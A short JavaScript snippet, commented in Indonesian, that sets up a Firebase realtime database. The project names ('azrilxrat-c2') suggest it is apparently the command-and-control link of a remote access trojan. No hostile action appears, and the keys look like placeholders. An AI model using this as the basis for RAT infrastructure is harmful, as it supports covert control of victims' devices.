// ⚠️ CONFIG YANG SAMA PERSIS DENGAN YANG DI PANEL!
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  authDomain: "azrilxrat-c2.firebaseapp.com",
  databaseURL: "https://azrilxrat-c2-default-rtdb.firebaseio.com",
  projectId: "azrilxrat-c2",
  storageBucket: "azrilxrat-c2.appspot.com",
  messagingSenderId: "123456789",
  appId: "1:123456789:web:abcdef123456"
};

firebase.initializeApp(FIREBASE_CONFIG);
const db = firebase.database();